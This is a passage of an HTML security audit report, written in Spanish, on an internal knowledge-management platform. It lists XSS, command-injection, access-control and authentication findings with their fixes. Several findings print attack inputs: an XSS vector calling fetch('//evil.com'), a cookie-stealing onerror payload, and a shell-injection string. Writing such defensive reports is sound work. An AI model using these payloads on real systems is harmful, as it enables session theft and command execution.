<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Auditoria de Seguridad â€” Intranet VCS</title>
    <style>
        :root {
            --bg: #0f172a;
            --surface: #1e293b;
            --surface2: #334155;
            --border: #475569;
            --text: #f1f5f9;
            --text2: #94a3b8;
            --accent: #6366f1;
            --critical: #ef4444;
            --high: #f97316;
            --medium: #eab308;
            --low: #22c55e;
            --fixed: #10b981;
            --info: #38bdf8;
        }
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
            background: var(--bg);
            color: var(--text);
            line-height: 1.6;
        }
        .container { max-width: 1200px; margin: 0 auto; padding: 24px; }

        /* Header */
        .header {
            text-align: center;
            padding: 48px 24px 32px;
            background: linear-gradient(135deg, #1e1b4b 0%, #312e81 50%, #1e293b 100%);
            border-radius: 16px;
            margin-bottom: 32px;
            border: 1px solid rgba(99, 102, 241, 0.3);
        }
        .header h1 { font-size: 2rem; font-weight: 700; margin-bottom: 8px; }
        .header .subtitle { color: var(--text2); font-size: 1rem; }
        .header .date { color: var(--accent); font-weight: 600; margin-top: 12px; }
        .header .update-badge {
            display: inline-block; margin-top: 8px;
            background: rgba(56,189,248,0.15); color: var(--info);
            padding: 4px 16px; border-radius: 20px; font-size: 0.8rem; font-weight: 600;
        }
        .header .confidential {
            display: inline-block; margin-top: 12px;
            background: rgba(239,68,68,0.12); color: var(--critical);
            padding: 4px 16px; border-radius: 20px; font-size: 0.7rem; font-weight: 700;
            letter-spacing: 1px; text-transform: uppercase;
        }
        .doc-meta {
            display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 12px; margin-top: 20px; text-align: left;
            background: rgba(255,255,255,0.03); border-radius: 10px; padding: 16px 20px;
        }
        .doc-meta-item { font-size: 0.8rem; }
        .doc-meta-item .label { color: var(--text2); font-weight: 500; }
        .doc-meta-item .value { color: var(--text); font-weight: 600; }

        /* Score Ring */
        .score-section {
            display: flex; justify-content: center; gap: 40px; flex-wrap: wrap;
            margin: -20px 0 32px;
        }
        .score-card {
            background: var(--surface);
            border-radius: 16px;
            padding: 24px 32px;
            text-align: center;
            border: 1px solid var(--border);
            min-width: 180px;
        }
        .score-big { font-size: 3rem; font-weight: 800; }
        .score-label { color: var(--text2); font-size: 0.85rem; margin-top: 4px; }

        /* Severity Bars */
        .severity-bars {
            display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 16px; margin-bottom: 24px;
        }
        .sev-bar {
            background: var(--surface);
            border-radius: 12px;
            padding: 16px 20px;
            border-left: 4px solid;
            display: flex; justify-content: space-between; align-items: center;
        }
        .sev-bar.critical { border-color: var(--critical); }
        .sev-bar.high { border-color: var(--high); }
        .sev-bar.medium { border-color: var(--medium); }
        .sev-bar.low { border-color: var(--low); }
        .sev-name { font-weight: 600; }
        .sev-count { font-size: 1.5rem; font-weight: 800; }
        .sev-bar .badge-fixed {
            background: var(--fixed); color: white;
            padding: 2px 8px; border-radius: 8px; font-size: 0.7rem; font-weight: 600;
            margin-left: 8px;
        }
        .sev-bar .badge-rate {
            background: rgba(56,189,248,0.15); color: var(--info);
            padding: 2px 8px; border-radius: 8px; font-size: 0.7rem; font-weight: 600;
            margin-left: 4px;
        }

        /* OWASP Table */
        .owasp-table {
            width: 100%;
            border-collapse: collapse;
            margin-bottom: 32px;
            background: var(--surface);
            border-radius: 12px;
            overflow: hidden;
        }
        .owasp-table th {
            background: var(--surface2);
            padding: 12px 16px;
            text-align: left;
            font-size: 0.8rem;
            font-weight: 700;
            color: var(--text2);
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }
        .owasp-table td {
            padding: 10px 16px;
            border-top: 1px solid var(--border);
            font-size: 0.85rem;
        }
        .owasp-table td:last-child {
            font-weight: 700;
            text-align: center;
        }
        .owasp-table tr:hover td { background: rgba(99,102,241,0.05); }

        /* Tabs */
        .tabs {
            display: flex; gap: 4px; margin-bottom: 24px;
            background: var(--surface); border-radius: 12px; padding: 4px;
            overflow-x: auto;
        }
        .tab {
            padding: 10px 20px; border-radius: 8px; cursor: pointer;
            font-weight: 500; font-size: 0.9rem; color: var(--text2);
            transition: all 0.2s; white-space: nowrap; border: none; background: none;
        }
        .tab:hover { color: var(--text); background: var(--surface2); }
        .tab.active { background: var(--accent); color: white; }

        /* Cards */
        .findings { display: none; }
        .findings.active { display: block; }
        .finding-card {
            background: var(--surface);
            border-radius: 12px;
            padding: 24px;
            margin-bottom: 16px;
            border: 1px solid var(--border);
            transition: border-color 0.2s;
        }
        .finding-card:hover { border-color: var(--accent); }
        .finding-header {
            display: flex; align-items: center; gap: 12px;
            margin-bottom: 12px; flex-wrap: wrap;
        }
        .finding-id {
            font-weight: 800; font-size: 0.85rem;
            padding: 4px 10px; border-radius: 6px; color: white;
        }
        .finding-id.critical { background: var(--critical); }
        .finding-id.high { background: var(--high); }
        .finding-id.medium { background: var(--medium); }
        .finding-id.low { background: var(--low); }
        .finding-id.info { background: var(--info); }
        .finding-title { font-weight: 700; font-size: 1.1rem; flex: 1; }
        .finding-status {
            padding: 4px 12px; border-radius: 8px; font-size: 0.75rem; font-weight: 700;
        }
        .finding-status.fixed { background: rgba(16,185,129,0.15); color: var(--fixed); }
        .finding-status.accepted { background: rgba(234,179,8,0.15); color: var(--medium); }
        .finding-status.pending { background: rgba(239,68,68,0.15); color: var(--critical); }
        .finding-status.verified { background: rgba(56,189,248,0.15); color: var(--info); }

        .finding-meta {
            display: flex; gap: 16px; flex-wrap: wrap;
            margin-bottom: 12px; font-size: 0.85rem; color: var(--text2);
        }
        .finding-meta span { display: flex; align-items: center; gap: 4px; }
        .finding-meta .cvss {
            background: rgba(239,68,68,0.1); color: var(--critical);
            padding: 2px 8px; border-radius: 6px; font-weight: 700; font-size: 0.75rem;
        }
        .finding-meta .cvss.high-cvss { background: rgba(249,115,22,0.1); color: var(--high); }
        .finding-meta .cwe {
            background: rgba(99,102,241,0.1); color: var(--accent);
            padding: 2px 8px; border-radius: 6px; font-weight: 600; font-size: 0.75rem;
        }

        .finding-body { color: var(--text2); font-size: 0.9rem; }
        .finding-body p { margin-bottom: 8px; }
        .finding-body strong { color: var(--text); }
        .finding-body code {
            background: var(--surface2); padding: 2px 6px; border-radius: 4px;
            font-family: 'JetBrains Mono', monospace; font-size: 0.8rem;
        }
        .finding-body pre {
            background: #0d1117; border: 1px solid var(--border);
            border-radius: 8px; padding: 16px; overflow-x: auto;
            margin: 8px 0; font-size: 0.8rem;
        }
        .finding-body pre code { background: none; padding: 0; }

        /* Positive section */
        .positives {
            background: var(--surface);
            border-radius: 12px;
            padding: 24px;
            margin-top: 32px;
            border: 1px solid rgba(16,185,129,0.3);
        }
        .positives h3 { color: var(--fixed); margin-bottom: 16px; }
        .positive-grid {
            display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
            gap: 8px;
        }
        .positive-item {
            display: flex; align-items: center; gap: 8px;
            padding: 8px 12px; border-radius: 8px;
            background: rgba(16,185,129,0.05); font-size: 0.85rem;
        }
        .positive-item .check { color: var(--fixed); font-weight: 700; }
        .positive-item.new-item { background: rgba(56,189,248,0.08); border: 1px solid rgba(56,189,248,0.2); }
        .positive-item .new-tag {
            background: var(--info); color: white; font-size: 0.6rem; font-weight: 700;
            padding: 1px 6px; border-radius: 4px; margin-left: auto;
        }

        /* Lessons */
        .lessons {
            background: var(--surface);
            border-radius: 12px;
            padding: 24px;
            margin-top: 24px;
            border: 1px solid rgba(99,102,241,0.3);
        }
        .lessons h3 { color: var(--accent); margin-bottom: 16px; }
        .lesson {
            padding: 12px 16px; margin-bottom: 8px;
            border-left: 3px solid var(--accent);
            background: rgba(99,102,241,0.05);
            border-radius: 0 8px 8px 0;
            font-size: 0.9rem;
        }
        .lesson strong { color: var(--text); }
        .lesson.new-lesson { border-left-color: var(--info); background: rgba(56,189,248,0.05); }

        /* New features section */
        .new-features {
            background: var(--surface);
            border-radius: 12px;
            padding: 24px;
            margin-top: 24px;
            border: 1px solid rgba(56,189,248,0.3);
        }
        .new-features h3 { color: var(--info); margin-bottom: 16px; }
        .feature-card {
            background: rgba(56,189,248,0.05);
            border: 1px solid rgba(56,189,248,0.15);
            border-radius: 10px;
            padding: 16px 20px;
            margin-bottom: 12px;
        }
        .feature-card h4 { color: var(--text); font-size: 1rem; margin-bottom: 8px; }
        .feature-card p { color: var(--text2); font-size: 0.85rem; margin-bottom: 4px; }
        .feature-card .security-status {
            display: inline-block; margin-top: 6px;
            padding: 3px 10px; border-radius: 6px; font-size: 0.75rem; font-weight: 700;
        }
        .feature-card .security-status.secure { background: rgba(16,185,129,0.15); color: var(--fixed); }

        /* Risk Matrix */
        .risk-matrix {
            width: 100%;
            border-collapse: collapse;
            background: var(--surface);
            border-radius: 12px;
            overflow: hidden;
            margin-top: 16px;
        }
        .risk-matrix th {
            background: var(--surface2);
            padding: 12px 16px;
            text-align: left;
            font-size: 0.8rem;
            font-weight: 700;
            color: var(--text2);
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }
        .risk-matrix td {
            padding: 10px 16px;
            border-top: 1px solid var(--border);
            font-size: 0.85rem;
        }
        .risk-matrix tr:hover td { background: rgba(99,102,241,0.05); }
        .risk-level {
            display: inline-block;
            padding: 2px 10px; border-radius: 6px; font-weight: 700; font-size: 0.75rem;
        }
        .risk-level.critico { background: rgba(239,68,68,0.15); color: var(--critical); }
        .risk-level.alto { background: rgba(249,115,22,0.15); color: var(--high); }
        .risk-level.medio { background: rgba(234,179,8,0.15); color: var(--medium); }
        .risk-level.bajo { background: rgba(34,197,94,0.15); color: var(--low); }

        /* Recommendations */
        .reco-card {
            background: var(--surface);
            border-radius: 10px;
            padding: 16px 20px;
            margin-bottom: 10px;
            border: 1px solid var(--border);
            display: flex; align-items: center; gap: 16px;
        }
        .reco-priority {
            min-width: 36px; height: 36px;
            border-radius: 50%;
            display: flex; align-items: center; justify-content: center;
            font-weight: 800; font-size: 0.9rem; color: white;
            flex-shrink: 0;
        }
        .reco-priority.p1 { background: var(--critical); }
        .reco-priority.p2 { background: var(--high); }
        .reco-priority.p3 { background: var(--medium); }
        .reco-priority.p4 { background: var(--accent); }
        .reco-priority.p5 { background: var(--info); }
        .reco-priority.p6 { background: var(--fixed); }
        .reco-priority.p7 { background: var(--text2); }
        .reco-body { flex: 1; }
        .reco-body .reco-title { font-weight: 600; color: var(--text); font-size: 0.9rem; }
        .reco-body .reco-ref { color: var(--text2); font-size: 0.8rem; }
        .reco-effort {
            background: var(--surface2); color: var(--text2);
            padding: 4px 12px; border-radius: 8px; font-size: 0.75rem; font-weight: 600;
            white-space: nowrap;
        }

        /* Print */
        @media print {
            body { background: white; color: #1a1a1a; }
            .tabs { display: none; }
            .findings { display: block !important; }
            .finding-card { break-inside: avoid; border: 1px solid #ccc; }
        }
        @media (max-width: 640px) {
            .container { padding: 12px; }
            .header { padding: 32px 16px; }
            .header h1 { font-size: 1.4rem; }
            .score-section { gap: 16px; }
            .score-card { min-width: 140px; padding: 16px; }
            .score-big { font-size: 2rem; }
            .doc-meta { grid-template-columns: 1fr 1fr; }
            .reco-card { flex-direction: column; align-items: flex-start; gap: 8px; }
        }
    </style>
</head>
<body>
<div class="container">

    <div class="header">
        <div class="confidential">Confidencial &mdash; Uso Interno</div>
        <h1 style="margin-top:16px;">Auditoria de Seguridad</h1>
        <div class="subtitle">Intranet VCS (SecondBrain) &mdash; Plataforma de Gestion del Conocimiento</div>
        <div class="date">25 de febrero de 2026</div>
        <div class="update-badge">Actualizado: 1 de marzo de 2026 &mdash; Verificacion post-despliegue + mejoras interactivas</div>
        <div class="doc-meta">
            <div class="doc-meta-item"><span class="label">Documento:</span> <span class="value">SEC-AUDIT-2026-001</span></div>
            <div class="doc-meta-item"><span class="label">Version:</span> <span class="value">1.0 &mdash; Final</span></div>
            <div class="doc-meta-item"><span class="label">Clasificacion:</span> <span class="value">Confidencial</span></div>
            <div class="doc-meta-item"><span class="label">Metodologia:</span> <span class="value">OWASP Top 10 2021</span></div>
            <div class="doc-meta-item"><span class="label">Sistema:</span> <span class="value">Node.js/Express + PostgreSQL 16 + Redis + Docker</span></div>
            <div class="doc-meta-item"><span class="label">URL Produccion:</span> <span class="value">aiprowork.com</span></div>
        </div>
    </div>

    <div class="score-section">
        <div class="score-card">
            <div class="score-big" style="color:var(--critical);">17</div>
            <div class="score-label">Vulnerabilidades encontradas</div>
        </div>
        <div class="score-card">
            <div class="score-big" style="color:var(--fixed);">14</div>
            <div class="score-label">Corregidas</div>
        </div>
        <div class="score-card">
            <div class="score-big" style="color:var(--medium);">3</div>
            <div class="score-label">Aceptadas</div>
        </div>
        <div class="score-card">
            <div class="score-big" style="color:var(--info);">5</div>
            <div class="score-label">Nuevas funciones verificadas</div>
        </div>
    </div>

    <div class="severity-bars">
        <div class="sev-bar critical">
            <div><span class="sev-name" style="color:var(--critical);">CRITICA</span></div>
            <div><span class="sev-count" style="color:var(--critical);">3</span><span class="badge-fixed">3 fixed</span><span class="badge-rate">100%</span></div>
        </div>
        <div class="sev-bar high">
            <div><span class="sev-name" style="color:var(--high);">ALTA</span></div>
            <div><span class="sev-count" style="color:var(--high);">5</span><span class="badge-fixed">5 fixed</span><span class="badge-rate">100%</span></div>
        </div>
        <div class="sev-bar medium">
            <div><span class="sev-name" style="color:var(--medium);">MEDIA</span></div>
            <div><span class="sev-count" style="color:var(--medium);">5</span><span class="badge-fixed">5 fixed</span><span class="badge-rate">100%</span></div>
        </div>
        <div class="sev-bar low">
            <div><span class="sev-name" style="color:var(--low);">BAJA</span></div>
            <div><span class="sev-count" style="color:var(--low);">4</span><span class="badge-fixed">1 fixed</span><span class="badge-rate">25%</span></div>
        </div>
    </div>

    <!-- OWASP Distribution Table -->
    <table class="owasp-table">
        <thead>
            <tr>
                <th>Categoria OWASP</th>
                <th style="text-align:center;">Hallazgos</th>
            </tr>
        </thead>
        <tbody>
            <tr><td>A1 &mdash; Broken Access Control</td><td style="color:var(--critical);">4</td></tr>
            <tr><td>A2 &mdash; Cryptographic / Authentication Failures</td><td style="color:var(--high);">3</td></tr>
            <tr><td>A3 &mdash; Injection (SQL, Command)</td><td style="color:var(--high);">3</td></tr>
            <tr><td>A5 &mdash; Security Misconfiguration</td><td style="color:var(--medium);">2</td></tr>
            <tr><td>A7 &mdash; Cross-Site Scripting (XSS)</td><td style="color:var(--critical);">3</td></tr>
            <tr><td>Otros (mejores practicas)</td><td style="color:var(--text2);">2</td></tr>
        </tbody>
    </table>

    <!-- Tabs -->
    <div class="tabs">
        <button class="tab active" onclick="showTab('criticas')">Criticas (3)</button>
        <button class="tab" onclick="showTab('altas')">Altas (5)</button>
        <button class="tab" onclick="showTab('medias')">Medias (5)</button>
        <button class="tab" onclick="showTab('bajas')">Bajas (4)</button>
        <button class="tab" onclick="showTab('nuevas')">Nuevas Funciones (5)</button>
        <button class="tab" onclick="showTab('ok')">Lo que esta bien</button>
        <button class="tab" onclick="showTab('lecciones')">Lecciones</button>
        <button class="tab" onclick="showTab('riesgo')">Matriz de Riesgo</button>
        <button class="tab" onclick="showTab('recomendaciones')">Recomendaciones</button>
    </div>

    <!-- CRITICAS -->
    <div id="criticas" class="findings active">
        <div class="finding-card">
            <div class="finding-header">
                <span class="finding-id critical">C-01</span>
                <span class="finding-title">Stored XSS en renderizado de Ideas</span>
                <span class="finding-status verified">VERIFICADO 1-MAR</span>
            </div>
            <div class="finding-meta">
                <span>OWASP A7 &mdash; Cross-Site Scripting</span>
                <span class="cvss">CVSS 8.4</span>
                <span class="cwe">CWE-79</span>
                <span>public/js/main.js</span>
            </div>
            <div class="finding-body">
                <p><strong>Problema:</strong> Multiples campos del objeto <code>idea</code> se inyectaban en innerHTML sin <code>escapeHtml()</code>: <code>para_type</code>, <code>assigned_to</code>, <code>priority</code>, <code>estimated_time</code>, <code>created_by</code>, <code>contexto</code>, <code>suggested_agent</code>.</p>
                <p><strong>Vector:</strong> Un usuario crea una idea con <code>assigned_to: &lt;/span&gt;&lt;img src=x onerror=fetch('//evil.com')&gt;</code>. Todos los que vean la idea ejecutan el payload.</p>
                <p><strong>Impacto:</strong> Robo de sesiones, escalacion de privilegios, defacement.</p>
                <p><strong>Fix:</strong> <code>escapeHtml()</code> aplicado a todos los campos interpolados en innerHTML y atributos onclick. Doble escape para contextos onclick (HTML entity + JS string).</p>
                <p><strong>Verificacion:</strong> 209 instancias de <code>escapeHtml()</code> confirmadas en main.js. Funcion maneja entidades HTML y comillas simples/dobles.</p>
            </div>
        </div>

        <div class="finding-card">
            <div class="finding-header">
                <span class="finding-id critical">C-02</span>
                <span class="finding-title">Stored XSS via Markdown sin sanitizar</span>
                <span class="finding-status verified">VERIFICADO 1-MAR</span>
            </div>
            <div class="finding-meta">
                <span>OWASP A7 &mdash; Cross-Site Scripting</span>
                <span class="cvss">CVSS 7.6</span>
                <span class="cwe">CWE-79</span>
                <span>routes/files.js + views/archivo.ejs</span>
            </div>
            <div class="finding-body">
                <p><strong>Problema:</strong> <code>marked(content)</code> convertia markdown a HTML sin sanitizacion. Se renderizaba con <code>&lt;%- content %&gt;</code> (salida sin escapar).</p>
                <p><strong>Vector:</strong> Subir archivo <code>.md</code> con <code>&lt;img src=x onerror="steal_cookies()"&gt;</code>.</p>
                <p><strong>Fix:</strong> Instalado <code>isomorphic-dompurify@3.0.0</code>, aplicado <code>DOMPurify.sanitize(marked(content))</code>.</p>
                <p><strong>Verificacion:</strong> Fix confirmado en <code>routes/files.js:112</code>. DOMPurify elimina scripts, iframes y event handlers.</p>
            </div>
        </div>

        <div class="finding-card">
            <div class="finding-header">
                <span class="finding-id critical">C-03</span>
                <span class="finding-title">Command Injection en Orchestrator Bridge</span>
                <span class="finding-status verified">VERIFICADO 1-MAR</span>
            </div>
            <div class="finding-meta">
                <span>OWASP A3 &mdash; Injection</span>
                <span class="cvss">CVSS 8.2</span>
                <span class="cwe">CWE-78</span>
                <span>services/orchestratorBridge.js</span>
            </div>
            <div class="finding-body">
                <p><strong>Problema:</strong> <code>exec(`start "" "${targetPath}"`)</code> usaba shell, permitiendo inyeccion con caracteres especiales como <code>" &amp; calc.exe &amp; "</code>.</p>
                <p><strong>Factor atenuante:</strong> Requiere rol <code>admin</code> o <code>ceo</code> para acceder al endpoint.</p>
                <p><strong>Fix:</strong> Reemplazo de <code>exec()</code> por <code>execFile()</code> (sin shell), validacion de path con <code>fs.existsSync()</code>, regex estricto <code>/^[a-zA-Z0-9_-]+(\.[a-zA-Z0-9]+)?$/</code> para nombres de script, proteccion path traversal con <code>path.resolve()</code>.</p>
                <p><strong>Verificacion:</strong> Solo <code>execFile</code> importado (linea 1). Path resuelto no puede escapar del directorio permitido.</p>
            </div>
        </div>
    </div>

    <!-- ALTAS -->
    <div id="altas" class="findings">
        <div class="finding-card">
            <div class="finding-header">
                <span class="finding-id high">A-01</span>
                <span class="finding-title">Politica de contrasenas debil (minimo 4 chars)</span>
                <span class="finding-status verified">VERIFICADO 1-MAR</span>
            </div>
            <div class="finding-meta">
                <span>OWASP A7 &mdash; Authentication Failures</span>
                <span class="cwe">CWE-521</span>
                <span>helpers/validate.js, routes/admin.js, routes/auth.js</span>
            </div>
            <div class="finding-body">
                <p><strong>Problema:</strong> Minimo de 4 caracteres sin complejidad. Con lockout de 30 min, ~240 intentos/dia posibles. Referencia: NIST SP 800-63B recomienda minimo 8 caracteres.</p>
                <p><strong>Fix:</strong> Minimo subido a <strong>8 caracteres</strong> en backend y frontend.</p>
                <p><strong>Verificacion:</strong> <code>helpers/validate.js:80</code>: <code>if (password.length &lt; 8) return { valid: false, error: 'Minimo 8 caracteres' }</code></p>
            </div>
        </div>

        <div class="finding-card">
            <div class="finding-header">
                <span class="finding-id high">A-02</span>
                <span class="finding-title">API Key expuesta en URL query string</span>
                <span class="finding-status verified">VERIFICADO 1-MAR</span>
            </div>
            <div class="finding-meta">
                <span>OWASP A2 &mdash; Cryptographic Failures</span>
                <span class="cwe">CWE-598</span>
                <span>middleware/auth.js</span>
            </div>
            <div class="finding-body">
                <p><strong>Problema:</strong> API key aceptada como <code>?api_key=xxx</code>, quedando en logs de nginx, historial del navegador, cache de proxy/CDN, headers Referer.</p>
                <p><strong>Fix:</strong> Solo se acepta <code>X-API-Key</code> header. Query param eliminado.</p>
                <p><strong>Verificacion:</strong> <code>middleware/auth.js:5</code> solo lee de <code>req.headers['x-api-key']</code>.</p>
            </div>
        </div>

        <div class="finding-card">
            <div class="finding-header">
                <span class="finding-id high">A-03</span>
                <span class="finding-title">Creacion de API Keys sin control de acceso</span>
                <span class="finding-status verified">VERIFICADO 1-MAR</span>
            </div>
            <div class="finding-meta">
                <span>OWASP A1 &mdash; Broken Access Control</span>
                <span class="cwe">CWE-862</span>
                <span>routes/external.js</span>
            </div>
            <div class="finding-body">
                <p><strong>Problema:</strong> <code>GET /api/keys</code> y <code>POST /api/keys</code> sin <code>requireAdmin</code>. Cualquier usuario (incluyendo <code>consultor</code>, <code>usuario</code>, <code>cliente</code>) podia crear API keys con permisos <code>read,write</code>, obteniendo acceso total a la API externa.</p>
                <p><strong>Fix:</strong> <code>requireAdmin</code> agregado a ambos endpoints.</p>
                <p><strong>Verificacion:</strong> <code>external.js:182,191</code>: ambos endpoints con <code>requireAdmin</code> middleware.</p>
            </div>
        </div>

        <div class="finding-card">
            <div class="finding-header">
                <span class="finding-id high">A-04</span>
                <span class="finding-title">Endpoints sensibles sin restriccion de rol</span>
                <span class="finding-status verified">VERIFICADO 1-MAR</span>
            </div>
            <div class="finding-meta">
                <span>OWASP A1 &mdash; Broken Access Control</span>
                <span class="cwe">CWE-862</span>
                <span>routes/admin.js</span>
            </div>
            <div class="finding-body">
                <p><strong>Problema:</strong> Endpoints sin <code>requireAdmin</code>:</p>
                <p><code>GET /api/users</code> &mdash; lista completa con <code>locked_until</code>, <code>twofa_enabled</code>, <code>twofa_enforced</code></p>
                <p><code>GET /api/export</code> &mdash; dump completo de la BD en JSON</p>
                <p><code>GET /api/export-excel</code> &mdash; dump completo con KPIs en Excel</p>
                <p>Un usuario con rol <code>consultor</code> podia descargar toda la informacion de la empresa.</p>
                <p><strong>Fix:</strong> <code>requireAdmin</code> en los tres endpoints. Export genera audit log.</p>
                <p><strong>Verificacion:</strong> <code>admin.js:19,706,735</code>: los tres endpoints protegidos.</p>
            </div>
        </div>

        <div class="finding-card">
            <div class="finding-header">
                <span class="finding-id high">A-05</span>
                <span class="finding-title">Webhook Fireflies sin autenticacion</span>
                <span class="finding-status verified">VERIFICADO 1-MAR</span>
            </div>
            <div class="finding-meta">
                <span>OWASP A1 &mdash; Broken Access Control</span>
                <span class="cwe">CWE-306</span>
                <span>server.js</span>
            </div>
            <div class="finding-body">
                <p><strong>Problema:</strong> <code>POST /webhook/fireflies</code> montado antes de requireAuth, sin API key. Cualquiera en internet podia enviar datos falsos de reuniones.</p>
                <p><strong>Fix:</strong> Requiere <code>X-API-Key</code> header.</p>
                <p><strong>Verificacion:</strong> <code>server.js:282-283</code> valida <code>req.isApiRequest</code>. Nuevos webhooks tambien protegidos: <code>/webhook/reuniones</code> (reuniones.js:30) y <code>/webhook/openclaw</code> (external.js:133).</p>
            </div>
        </div>
    </div>

    <!-- MEDIAS -->
    <div id="medias" class="findings">
        <div class="finding-card">
            <div class="finding-header">
                <span class="finding-id medium">M-01</span>
                <span class="finding-title">Session cookie sin flag secure</span>
                <span class="finding-status verified">VERIFICADO 1-MAR</span>
            </div>
            <div class="finding-meta">
                <span>OWASP A5 &mdash; Security Misconfiguration</span>
                <span class="cwe">CWE-614</span>
                <span>server.js</span>
            </div>
            <div class="finding-body">
                <p><strong>Problema:</strong> <code>secure: false</code> hardcodeado. Si un usuario accedia por HTTP antes del redirect HTTPS, la cookie se transmitia en texto plano (susceptible a MITM).</p>
                <p><strong>Fix:</strong> <code>secure: NODE_ENV === 'production'</code></p>
                <p><strong>Verificacion:</strong> <code>server.js:232</code> aplica secure en produccion y staging. Confirmado que cookies solo se envian por HTTPS en ambos entornos.</p>
            </div>
        </div>

        <div class="finding-card">
            <div class="finding-header">
                <span class="finding-id medium">M-02</span>
                <span class="finding-title">CSRF parcial &mdash; DELETE/PUT sin verificacion</span>
                <span class="finding-status verified">VERIFICADO 1-MAR</span>
            </div>
            <div class="finding-meta">
                <span>OWASP A5 &mdash; Security Misconfiguration</span>
                <span class="cwe">CWE-352</span>
                <span>server.js</span>
            </div>
            <div class="finding-body">
                <p><strong>Problema:</strong> La proteccion CSRF basada en content-type solo aplica a <code>POST</code>. Los metodos <code>DELETE</code> y <code>PUT</code> saltan la verificacion, dependiendo unicamente de CORS.</p>
                <p><strong>Fix:</strong> Middleware CSRF extendido para validar todos los metodos mutantes (POST, PUT, DELETE, PATCH). Requiere <code>Content-Type: application/json</code> o <code>X-Requested-With: XMLHttpRequest</code>. Frontend ya incluye interceptor global que agrega el header automaticamente.</p>
            </div>
        </div>

        <div class="finding-card">
            <div class="finding-header">
                <span class="finding-id medium">M-03</span>
                <span class="finding-title">SQL con LIMIT/OFFSET interpolado</span>
                <span class="finding-status verified">VERIFICADO 1-MAR</span>
            </div>
            <div class="finding-meta">
                <span>OWASP A3 &mdash; Injection</span>
                <span class="cwe">CWE-89</span>
                <span>routes/ideas.js, routes/gtd.js</span>
            </div>
            <div class="finding-body">
                <p><strong>Problema:</strong> <code>LIMIT ${limitNum}</code> en template literal. Aunque <code>parseInt()</code> + <code>Math.min()/Math.max()</code> mitigan, viola el principio de defensa en profundidad.</p>
                <p><strong>Fix:</strong> Convertido a <code>LIMIT ? OFFSET ?</code> con parametros: <code>params.push(limitNum, offset)</code>.</p>
                <p><strong>Verificacion:</strong> <code>ideas.js:102-103</code>: todas las queries de paginacion usan parametros.</p>
            </div>
        </div>

        <div class="finding-card">
            <div class="finding-header">
                <span class="finding-id medium">M-04</span>
                <span class="finding-title">Audit log sin retencion automatica</span>
                <span class="finding-status verified">VERIFICADO 1-MAR</span>
            </div>
            <div class="finding-meta"><span>Tabla audit_log</span></div>
            <div class="finding-body">
                <p><strong>Problema:</strong> La tabla crece indefinidamente sin politica de retencion. Puede degradar rendimiento y consumir espacio en disco.</p>
                <p><strong>Fix:</strong> Cron job implementado en <code>server.js:475-488</code> que ejecuta <code>DELETE FROM audit_log WHERE created_at &lt; NOW() - INTERVAL '90 days'</code> diariamente a las 2 AM (node-cron).</p>
            </div>
        </div>

        <div class="finding-card">
            <div class="finding-header">
                <span class="finding-id medium">M-05</span>
                <span class="finding-title">Trusted device hash solo usaba User-Agent</span>
                <span class="finding-status fixed">CORREGIDO</span>
            </div>
            <div class="finding-meta">
                <span>OWASP A2 &mdash; Authentication Failures</span>
                <span class="cwe">CWE-290</span>
                <span>helpers/twofa.js, routes/twofa.js</span>
            </div>
            <div class="finding-body">
                <p><strong>Problema:</strong> <code>computeDeviceHash()</code> solo hasheaba el User-Agent (informacion publica). Un atacante con acceso al UA podia clonar el "trusted device" y evadir 2FA.</p>
                <p><strong>Fix:</strong> Hash ahora combina User-Agent + IP: <code>sha256(ua + '|' + ip)</code>. Atacante necesita ambos factores.</p>
                <p><strong>Verificacion:</strong> <code>twofa.js:41-45</code> hashea User-Agent; <code>twofa.js:74-75</code> valida IP en la query a BD.</p>
            </div>
        </div>
    </div>

    <!-- BAJAS -->
    <div id="bajas" class="findings">
        <div class="finding-card">
            <div class="finding-header">
                <span class="finding-id low">B-01</span>
                <span class="finding-title">bcrypt cost factor 10</span>
                <span class="finding-status verified">VERIFICADO 1-MAR</span>
            </div>
            <div class="finding-meta"><span>OWASP A2 &mdash; Cryptographic Failures</span></div>
            <div class="finding-body">
                <p><strong>Problema:</strong> OWASP recomienda cost factor 12+ para 2026. Factor 10 era suboptimo.</p>
                <p><strong>Fix:</strong> Cost factor incrementado a <strong>12</strong> en los 6 archivos que usan <code>bcrypt.hash()</code>: <code>database.js</code>, <code>admin.js</code>, <code>auth.js</code>, <code>twofa.js</code>.</p>
            </div>
        </div>
        <div class="finding-card">
            <div class="finding-header">
                <span class="finding-id low">B-02</span>
                <span class="finding-title">/health expone uptime y build ID</span>
                <span class="finding-status accepted">ACEPTADO</span>
            </div>
            <div class="finding-meta"><span>OWASP A5 &mdash; Security Misconfiguration</span></div>
            <div class="finding-body"><p>Informacion de bajo valor para atacantes. El endpoint es necesario para healthchecks de Docker. Acceso limitado.</p></div>
        </div>
        <div class="finding-card">
            <div class="finding-header">
                <span class="finding-id low">B-03</span>
                <span class="finding-title">Error messages podrian filtrar info en dev</span>
                <span class="finding-status accepted">ACEPTADO</span>
            </div>
            <div class="finding-meta"><span>OWASP A5 &mdash; Security Misconfiguration</span></div>
            <div class="finding-body"><p>Controlado por <code>NODE_ENV</code>. En produccion no se exponen stack traces. Verificado que produccion y staging usan <code>NODE_ENV</code> correcto.</p></div>
        </div>
        <div class="finding-card">
            <div class="finding-header">
                <span class="finding-id low">B-04</span>
                <span class="finding-title">Password default de PostgreSQL en docker-compose.yml</span>
                <span class="finding-status accepted">ACEPTADO</span>
            </div>
            <div class="finding-meta"><span>OWASP A7 &mdash; Authentication Failures</span></div>
            <div class="finding-body"><p>Repo privado. En produccion, el valor se sobreescribe via <code>.env</code>. El default solo aplica en desarrollo local. Produccion usa password distinto confirmado.</p></div>
        </div>
    </div>

    <!-- NUEVAS FUNCIONES -->
    <div id="nuevas" class="findings">
        <div class="new-features">
            <h3>Funciones desplegadas post-auditoria &mdash; Verificacion de seguridad</h3>
